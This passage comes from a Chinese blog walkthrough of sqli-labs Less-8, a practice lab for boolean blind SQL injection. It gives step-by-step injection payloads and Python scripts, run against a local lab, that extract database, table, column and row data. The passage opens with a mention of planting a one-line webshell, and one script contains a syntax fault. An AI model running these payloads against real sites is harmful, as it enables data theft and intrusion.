即可开启，开启后便可写入一句话木马再用中国蚁剑链接就可以查看数据了。</p><h1 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h1><p>首先id=1，发现这又是个盲注</p><p><img src="/2021/02/17/sql-libs-wp/34.png"></p><p>接着试了id=1‘ 和id=1’ –+</p><p><img src="/2021/02/17/sql-libs-wp/35.png"></p><p><img src="/2021/02/17/sql-libs-wp/36.png"></p><p>得出这是由单引号闭合的，而less-5和less-6的方法已经不适用了，百度后知道这是布尔盲注，手动注很麻烦，得要脚本。</p><p>以下为涨到的姿势（目前还不会写脚本，先放过这题）</p><p>若为布尔盲注，则按照以下步骤进行：</p><p><strong>1、得到数据库的长度</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?id&#x3D;2&#39; and length(database())&gt;1%23</span><br></pre></td></tr></table></figure><p>其中的&gt;号也可换=不断地试</p><p><strong>2、判断当前数据库里有几张表</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ((<span class="keyword">select</span>  <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">4</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><strong>3、判断每张表的长度</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>  length((<span class="keyword">select</span>  table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">6</span> <span class="comment">--+</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> length(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">6</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><strong>4、判断表具体某张表的列数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ((<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)<span class="operator">=</span><span class="number">3</span>) <span class="comment">--+</span></span><br><span class="line"><span class="keyword">and</span> ((<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">3</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">3</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><strong>5、判断某张表里对应的字段的数据的长度</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>  length((<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span>))<span class="operator">=</span><span class="number">4</span> <span class="comment">--+ 			</span></span><br><span class="line"><span class="keyword">and</span>  length((<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span>))<span class="operator">=</span><span class="number">4</span> <span class="comment">--+ 			</span></span><br></pre></td></tr></table></figure><p><strong>6、获取数据库名称</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr(database(), &#123;0&#125;, 1))&#x3D;&#123;1&#125;%23  &#x2F;&#x2F;这里得到第一个字母为s，也就是security的s，明显要一个一个试会很麻烦，所以要用到脚本。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDBName</span>(<span class="params">DBName_len</span>):</span>  </span><br><span class="line">    DBName = <span class="string">&quot;&quot;</span>  </span><br><span class="line">     </span><br><span class="line">    success_url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-8/?id=1&quot;</span>  </span><br><span class="line">    success_response_len = <span class="built_in">len</span>(requests.get(success_url).text)  </span><br><span class="line">     </span><br><span class="line">    url_template = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;%23&quot;</span>  </span><br><span class="line">    chars = <span class="string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span>  </span><br><span class="line">     </span><br><span class="line">    print(<span class="string">&quot;Start to retrieve database name...&quot;</span>)  </span><br><span class="line">    print(<span class="string">&quot;Success_response_len is: &quot;</span>, success_response_len)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>( <span class="number">1</span>, DBName_len + <span class="number">1</span>):  </span><br><span class="line">        print(<span class="string">&quot;Number of letter: &quot;</span> , i)  </span><br><span class="line">        tempDBName = DBName  </span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:  </span><br><span class="line">            print(<span class="string">&quot;Test letter &quot;</span> + char)  </span><br><span class="line">            char_ascii = <span class="built_in">ord</span>(char)  </span><br><span class="line">            url = url_template.<span class="built_in">format</span>(i, char_ascii)  </span><br><span class="line">            response = requests.get(url)  </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(response.text) == success_response_len:  </span><br><span class="line">                DBName += char  </span><br><span class="line">                print(<span class="string">&quot;DBName is: &quot;</span> + DBName + <span class="string">&quot;...&quot;</span>)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">        <span class="keyword">if</span> tempDBName == DBName:  </span><br><span class="line">            print(<span class="string">&quot;Letters too little! Program ended.&quot;</span> )  </span><br><span class="line">            exit()  </span><br><span class="line">    print(<span class="string">&quot;Retrieve completed! DBName is: &quot;</span> + DBName)</span><br><span class="line">    getDBName(<span class="number">8</span>) //这里也要逐个试</span><br><span class="line">     </span><br></pre></td></tr></table></figure><p>最后得到结果：</p><p><img src="/2021/02/17/sql-libs-wp/37.png"></p><p><strong>7、获取表名</strong></p><p>和上一步获得数据库名差不多，姿势稍微变了一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)), &#123;0&#125;, 1)&#x3D;&#123;1&#125;%23 &#x2F;&#x2F;这里就没试了</span><br></pre></td></tr></table></figure><p><strong>8、获取字段名称</strong></p><p>姿势：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select column_name from information_schema.columns where table_name &#x3D; 0x666C6167 limit 0,1), &#123;0&#125;, 1))&#x3D;&#123;1&#125;%23</span><br></pre></td></tr></table></figure><p><strong>9、总合</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> binascii  </span><br><span class="line">  </span><br><span class="line">MAX_DBName_len = <span class="number">100</span>  </span><br><span class="line">MAX_TableName_len = <span class="number">100</span>  </span><br><span class="line">MAX_ColumnName_len = <span class="number">100</span>  </span><br><span class="line">MAX_Data_len = <span class="number">100</span>  </span><br><span class="line">MAX_Table_Num = <span class="number">100</span>  </span><br><span class="line">MAX_Column_Num = <span class="number">100</span>  </span><br><span class="line">MAX_Data_Num = <span class="number">100</span>  </span><br><span class="line">  </span><br><span class="line">success_url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-8/?id=1&quot;</span>  </span><br><span class="line">success_response_len = <span class="built_in">len</span>(requests.get(success_url).text)  </span><br><span class="line">chars = <span class="string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#123;&#125;_!@#$%^&amp;*()&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_DBName_len</span>():</span>  </span><br><span class="line">    print(<span class="string">&quot;Start to get DBName_len...&quot;</span>)  </span><br><span class="line">    DBName_len = <span class="number">0</span>  </span><br><span class="line">    url_template = success_url + <span class="string">&quot;&#x27; and (length(database()))&gt;&#123;0&#125;%23&quot;</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, MAX_DBName_len):  </span><br><span class="line">        url = url_template.<span class="built_in">format</span>(i)  </span><br><span class="line">        response = requests.get(url)  </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(response.text) != success_response_len:  </span><br><span class="line">            DBName_len = i;  </span><br><span class="line">            print(<span class="string">&quot;DBName_len is: &quot;</span>, DBName_len)  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">    <span class="keyword">if</span> DBName_len == <span class="number">0</span>:  </span><br><span class="line">        <span class="keyword">if</span> i == MAX_DBName_len - <span class="number">1</span>:  </span><br><span class="line">            print(<span class="string">&quot;DBName_len &gt; MAX_DBName_len!&quot;</span>)  </span><br><span class="line">        print(<span class="string">&quot;Cannot get DB_len. Program ended.&quot;</span>)  </span><br><span class="line">        exit()  </span><br><span class="line">    <span class="keyword">return</span> DBName_len  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_DBName</span>(<span class="params">DBName_len</span>):</span>  </span><br><span class="line">    print(<span class="string">&quot;Start to retrieve database name...&quot;</span>)  </span><br><span class="line">    DBName = <span class="string">&quot;&quot;</span>  </span><br><span class="line">    url_template = success_url + <span class="string">&quot;&#x27; and ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;%23&quot;</span>     </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, DBName_len + <span class="number">1</span>):  </span><br><span class="line">        print(<span class="string">&quot;Number of letter: &quot;</span>, i)  </span><br><span class="line">        tempDBName = DBName  </span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:  </span><br><span class="line">            print(<span class="string">&quot;Test letter &quot;</span> + char)  </span><br><span class="line">            char_ascii = <span class="built_in">ord</span>(char)  </span><br><span class="line">            url = url_template.<span class="built_in">format</span>(i, char_ascii)  </span><br><span class="line">            response = requests.get(url)  </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(response.text) == success_response_len:  </span><br><span class="line">                DBName += char  </span><br><span class="line">                print(<span class="string">&quot;DBName is: &quot;</span> + DBName + <span class="string">&quot;...&quot;</span>)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">        <span class="keyword">if</span> tempDBName == DBName:  </span><br><span class="line">            print(<span class="string">&quot;Letters too little! Program ended.&quot;</span>)  </span><br><span class="line">            exit()  </span><br><span class="line">    print(<span class="string">&quot;Retrieve completed! DBName is: &quot;</span> + DBName)  </span><br><span class="line">    <span class="keyword">return</span> DBName  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_TableName_len</span>(<span class="params">Table_num</span>):</span>  </span><br><span class="line">    print(<span class="string">&quot;Start to get TableName_len...&quot;</span>)  </span><br><span class="line">    TableName_len = <span class="number">0</span>  </span><br><span class="line">    url_template = success_url + <span class="string">&quot;&#x27; and (select length(table_name) from information_schema.tables where table_schema = database() limit &#123;0&#125;,1)&gt;&#123;1&#125;%23&quot;</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, MAX_TableName_len):  </span><br><span class="line">        url = url_template.<span class="built_in">format</span>(Table_num - <span class="number">1</span>, i)  </span><br><span class="line">        response = requests.get(url)  </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(response.text) != success_response_len:  </span><br><span class="line">            TableName_len = i  </span><br><span class="line"><span class="comment">#             print(&quot;TabelName_len is: &quot;, TableName_len)  </span></span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">if</span> TableName_len == <span class="number">0</span>:  </span><br><span class="line">        <span class="keyword">if</span> i == MAX_TableName_len - <span class="number">1</span>:  </span><br><span class="line">            print(<span class="string">&quot;TableName_len &gt; MAX_TableName_len!&quot;</span>)  </span><br><span class="line"><span class="comment">#         print(&quot;Cannot get TableName_len. Program ended.&quot;)  </span></span><br><span class="line">    <span class="keyword">return</span> TableName_len  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_TableName</span>(<span class="params">Table_num, TableName_len</span>):</span>  </span><br><span class="line">    print(<span class="string">&quot;Start to get TableName...&quot;</span>)  </span><br><span class="line">    TableName = <span class="string">&quot;&quot;</span>  </span><br><span class="line">    url_template = success_url + <span class="string">&quot;&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;%23&quot;</span>     </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, TableName_len + <span class="number">1</span>):  </span><br><span class="line">        print(<span class="string">&quot;Number of letter: &quot;</span>, i)  </span><br><span class="line">        tempTableName = TableName  </span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:  </span><br><span class="line">            print(<span class="string">&quot;Test letter &quot;</span> + char)  </span><br><span class="line">            char_ascii = <span class="built_in">ord</span>(char)  </span><br><span class="line">            url = url_template.<span class="built_in">format</span>(Table_num - <span class="number">1</span>, i, char_ascii)  </span><br><span class="line">            response = requests.get(url)  </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(response.text) == success_response_len:  </span><br><span class="line">                TableName += char  </span><br><span class="line">                print(<span class="string">&quot;TableName is: &quot;</span> + TableName + <span class="string">&quot;...&quot;</span>)  </span><br><span class="line">                <span class="keyword">break</span>             </span><br><span class="line">        <span class="keyword">if</span> tempTableName == TableName:  </span><br><span class="line">            print(<span class="string">&quot;Letters too little! Program ended.&quot;</span>)  </span><br><span class="line">            exit()  </span><br><span class="line">    print(<span class="string">&quot;Retrieve completed! TableName is: &quot;</span> + TableName)  </span><br><span class="line">    <span class="keyword">return</span> TableName  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose_Table</span>():</span>  </span><br><span class="line">    Tables = []  </span><br><span class="line">    <span class="keyword">for</span> Table_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, MAX_Table_Num):  </span><br><span class="line">        TableName_len = get_TableName_len(Table_num)  </span><br><span class="line">        <span class="keyword">if</span> TableName_len == <span class="number">0</span>:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        TableName = get_TableName(Table_num, TableName_len)  </span><br><span class="line">        Tables.append(TableName)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Tables)):  </span><br><span class="line">        print(i, <span class="string">&quot;: &quot;</span> + Tables[i - <span class="number">1</span>])  </span><br><span class="line">    value = <span class="built_in">input</span>(<span class="string">&#x27;Please input number to choose which table you want to dump:&#x27;</span>)  </span><br><span class="line">    Table_num_chosen = <span class="built_in">int</span>(value)  </span><br><span class="line">    print(<span class="string">&quot;You have chose table: &quot;</span> + Tables[Table_num_chosen - <span class="number">1</span>])  </span><br><span class="line">    <span class="keyword">return</span> Tables[Table_num_chosen - <span class="number">1</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ColumnName_len</span>(<span class="params">Column_num, TableName</span>):</span>  </span><br><span class="line">    print(<span class="string">&quot;Start to get ColumnName_len...&quot;</span>)  </span><br><span class="line">    ColumnName_len = <span class="number">0</span>  </span><br><span class="line">    url_template = success_url + <span class="string">&quot;&#x27; and (select length(column_name) from information_schema.columns where table_name = &#123;0&#125; limit &#123;1&#125;,1)&gt;&#123;2&#125;%23&quot;</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, MAX_ColumnName_len):  </span><br><span class="line">        url = url_template.<span class="built_in">format</span>(str2hex(TableName), Column_num - <span class="number">1</span>, i)  </span><br><span class="line">        response = requests.get(url)  </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(response.text) != success_response_len:  </span><br><span class="line">            ColumnName_len = i  </span><br><span class="line">            print(<span class="string">&quot;ColumnName_len is: &quot;</span>, ColumnName_len)  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">if</span> ColumnName_len == <span class="number">0</span>:  </span><br><span class="line">        <span class="keyword">if</span> i == MAX_ColumnName_len - <span class="number">1</span>:  </span><br><span class="line">            print(<span class="string">&quot;ColumnName_len &gt; MAXName_Column_len!&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> ColumnName_len  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ColumnName</span>(<span class="params">Column_num, ColumnName_len, TableName</span>):</span>  </span><br><span class="line">    print(<span class="string">&quot;Start to get ColumnName...&quot;</span>)  </span><br><span class="line">    ColumnName = <span class="string">&quot;&quot;</span>  </span><br><span class="line">    url_template = success_url + <span class="string">&quot;&#x27; and ascii(substr((select column_name from information_schema.columns where table_name = &#123;0&#125; limit &#123;1&#125;,1),&#123;2&#125;,1))=&#123;3&#125;%23&quot;</span>     </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ColumnName_len + <span class="number">1</span>):  </span><br><span class="line">        print(<span class="string">&quot;Number of letter: &quot;</span>, i)  </span><br><span class="line">        tempColumnName = ColumnName  </span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:  </span><br><span class="line">            print(<span class="string">&quot;Test letter &quot;</span> + char)  </span><br><span class="line">            char_ascii = <span class="built_in">ord</span>(char)  </span><br><span class="line">            url = url_template.<span class="built_in">format</span>(str2hex(TableName), Column_num - <span class="number">1</span>, i, char_ascii)  </span><br><span class="line">            response = requests.get(url)  </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(response.text) == success_response_len:  </span><br><span class="line">                ColumnName += char  </span><br><span class="line">                print(<span class="string">&quot;ColumnName is: &quot;</span> + ColumnName + <span class="string">&quot;...&quot;</span>)  </span><br><span class="line">                <span class="keyword">break</span>             </span><br><span class="line">        <span class="keyword">if</span> tempColumnName == ColumnName:  </span><br><span class="line">            print(<span class="string">&quot;Letters too little! Program ended.&quot;</span>)  </span><br><span class="line">            exit()  </span><br><span class="line">    print(<span class="string">&quot;Retrieve completed! ColumnName is: &quot;</span> + ColumnName)  </span><br><span class="line">    <span class="keyword">return</span> ColumnName  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_Columns</span>(<span class="params">TableName</span>):</span>  </span><br><span class="line">    Columns = []  </span><br><span class="line">    <span class="keyword">for</span> Column_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, MAX_Column_Num):  </span><br><span class="line">        ColumnName_len = get_ColumnName_len(Column_num, TableName)  </span><br><span class="line">        <span class="keyword">if</span> ColumnName_len == <span class="number">0</span>:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        ColumnName = get_ColumnName(Column_num, ColumnName_len, TableName)  </span><br><span class="line">        Columns.append(ColumnName)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Columns)):  </span><br><span class="line">        print(i, <span class="string">&quot;: &quot;</span> + Columns[i - <span class="number">1</span>])  </span><br><span class="line">    <span class="keyword">return</span> Columns  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_Data_len</span>(<span class="params">TableName, ColumnName, Data_num</span>):</span>  </span><br><span class="line">    print(<span class="string">&quot;Start to get Data_len...&quot;</span>)  </span><br><span class="line">    Data_len = <span class="number">0</span>  </span><br><span class="line">    url_template = success_url + <span class="string">&quot;&#x27; and (select length(&#123;0&#125;) from &#123;1&#125; limit &#123;2&#125;,1)&gt;&#123;3&#125;%23&quot;</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, MAX_Data_len):  </span><br><span class="line">        url = url_template.<span class="built_in">format</span>(ColumnName, TableName, Data_num - <span class="number">1</span>, i)  </span><br><span class="line">        response = requests.get(url)  </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(response.text) != success_response_len:  </span><br><span class="line">            Data_len = i  </span><br><span class="line">            print(<span class="string">&quot;Data_len is: &quot;</span>, Data_len)  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">if</span> Data_len == <span class="number">0</span>:  </span><br><span class="line">        <span class="keyword">if</span> i == MAX_Data_len - <span class="number">1</span>:  </span><br><span class="line">            print(<span class="string">&quot;Data_len &gt; MAX_Data_len!&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> Data_len  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_Data</span>(<span class="params">TableName, ColumnName, Data_num, Data_len</span>):</span>  </span><br><span class="line">    print(<span class="string">&quot;Start to get Data...&quot;</span>)  </span><br><span class="line">    Data = <span class="string">&quot;&quot;</span>  </span><br><span class="line">    url_template = success_url + <span class="string">&quot;&#x27; and ascii(substr((select &#123;0&#125; from &#123;1&#125; limit &#123;2&#125;,1),&#123;3&#125;,1))=&#123;4&#125;%23&quot;</span>     </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, Data_len + <span class="number">1</span>):  </span><br><span class="line">        print(<span class="string">&quot;Number of letter: &quot;</span>, i)  </span><br><span class="line">        tempData = Data  </span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:  </span><br><span class="line">            print(<span class="string">&quot;Test letter &quot;</span> + char)  </span><br><span class="line">            char_ascii = <span class="built_in">ord</span>(char)  </span><br><span class="line">            url = url_template.<span class="built_in">format</span>(ColumnName, TableName, Data_num - <span class="number">1</span>, i, char_ascii)  </span><br><span class="line">            response = requests.get(url)  </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(response.text) == success_response_len:  </span><br><span class="line">                Data += char  